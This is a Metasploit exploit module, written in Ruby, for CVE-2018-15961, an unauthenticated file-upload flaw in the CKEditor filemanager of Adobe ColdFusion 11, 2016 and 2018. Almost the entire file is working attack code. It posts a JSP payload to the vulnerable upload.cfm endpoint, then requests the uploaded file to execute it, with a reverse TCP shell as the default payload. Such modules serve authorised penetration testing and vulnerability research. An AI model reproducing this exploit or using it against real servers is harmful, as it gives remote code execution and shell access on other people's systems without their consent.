# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  include Msf::Exploit::Remote::HttpClient

  Rank = ExcellentRanking

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;            => &#039;Adobe ColdFusion CKEditor unrestricted file upload&#039;,
      &#039;Description&#039;     => %q{
        A file upload vulnerability in the CKEditor of Adobe ColdFusion 11
        (Update 14 and earlier), ColdFusion 2016 (Update 6 and earlier), and
        ColdFusion 2018 (July 12 release) allows unauthenticated remote
        attackers to upload and execute JSP files through the filemanager
        plugin.
        Tested on Adobe ColdFusion 2018.0.0.310739.
      },
      &#039;Author&#039;          =>
        [
          &#039;Pete Freitag de Foundeo&#039;,  # Vulnerability discovery
          &#039;Vahagn vah_13 Vardanian&#039;,  # First public PoC
          &#039;Qazeer&#039;                    # Metasploit module
        ],
      &#039;License&#039;         => MSF_LICENSE,
      &#039;References&#039;      =>
        [
          [ &#039;CVE&#039;, &#039;2018-15961&#039; ],
          [ &#039;BID&#039;, &#039;105314&#039; ],
          [ &#039;URL&#039;, &#039;https://helpx.adobe.com/fr/security/products/coldfusion/apsb18-33.html&#039; ]
        ],
      &#039;Privileged&#039;      => false,
      &#039;Platform&#039;        => %w{ linux win },
      &#039;Arch&#039;            => ARCH_JAVA,
      &#039;Targets&#039;         =>
        [
          [ &#039;Java Universal&#039;,
            {
              &#039;Arch&#039;     => ARCH_JAVA,
              &#039;Platform&#039; => %w{ linux win },
              &#039;Payload&#039;  => { &#039;DisableNops&#039; => true },
              &#039;DefaultOptions&#039; => {&#039;PAYLOAD&#039; => &#039;java/jsp_shell_reverse_tcp&#039;}
            }
          ]
        ],
      &#039;DefaultTarget&#039;   => 0,
      &#039;DefaultOptions&#039;  => { &#039;RPORT&#039; => 8500 },
      &#039;DisclosureDate&#039;  => &#039;Sep 11 2018&#039;
    ))

    register_options [
      OptString.new(&#039;TARGETURI&#039;, [ false, &#039;Base application path&#039;, &#039;/&#039; ]),
    ]
  end

  def exploit
    filename = rand_text_alpha_upper(1..10) + &#039;.jsp&#039;

    print_status("Uploading the JSP payload at #{target_uri}cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/uploadedFiles/#{filename}...")

    mime = Rex::MIME::Message.new
    mime.add_part(payload.encoded, &#039;application/octet-stream&#039;, nil, "form-data; name=\"file\"; filename=\"#{filename}\"")
    mime.add_part(&#039;path&#039;, &#039;text/plain&#039;, nil, &#039;form-data; name="path"&#039;)

    post_str = mime.to_s
    post_str.strip!

    res = send_request_cgi({
      &#039;uri&#039;     => normalize_uri(target_uri, &#039;cf_scripts&#039;,&#039;scripts&#039;,&#039;ajax&#039;,&#039;ckeditor&#039;,&#039;plugins&#039;,&#039;filemanager&#039;,&#039;upload.cfm&#039;),
      &#039;version&#039; => &#039;1.1&#039;,
      &#039;method&#039;  => &#039;POST&#039;,
      &#039;ctype&#039;   => &#039;multipart/form-data; boundary=&#039; + mime.bound,
      &#039;data&#039;    => post_str,
    })

    unless res && res.code == 200
      fail_with Failure::Unknown, &#039;Upload Failed...&#039;
    end

    print_good(&#039;Upload succeeded! Executing payload...&#039;)

    send_request_cgi({
      &#039;uri&#039;     => normalize_uri(target_uri, &#039;cf_scripts&#039;, &#039;scripts&#039;, &#039;ajax&#039;,
                    &#039;ckeditor&#039;, &#039;plugins&#039;, &#039;filemanager&#039;, &#039;uploadedFiles&#039;, filename),
      &#039;method&#039; => &#039;GET&#039;
    }, 5)

  end
end

